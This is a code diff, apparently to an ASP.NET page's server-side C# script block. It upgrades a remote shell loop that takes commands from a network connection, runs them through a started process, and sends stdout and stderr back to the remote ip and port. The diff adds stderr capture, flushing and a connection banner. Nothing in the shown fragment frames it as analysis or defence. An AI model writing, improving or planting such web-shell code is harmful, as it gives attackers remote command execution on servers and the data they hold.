@@ -22,11 +22,28 @@
         proc.Start();
         StreamReader procOut = proc.StandardOutput;
         StreamWriter procIn = proc.StandardInput;
+        StreamReader procErr = proc.StandardError;
+
+        wtr.WriteLine("Connected to " + ip + ":" + port);
+
         while (true)
         {
-            wtr.WriteLine(procOut.ReadLine());
-            procIn.WriteLine(rdr.ReadLine());
+            string command = rdr.ReadLine();
+            if (command == null) break;
+            procIn.WriteLine(command);
+            procIn.Flush();
+            while (!procOut.EndOfStream)
+            {
+                wtr.WriteLine(procOut.ReadLine());
+                wtr.Flush();
+            }
+            while (!procErr.EndOfStream)
+            {
+                wtr.WriteLine(procErr.ReadLine());
+                wtr.Flush();
+            }
         }
+
         proc.Close();
     }
 </script>
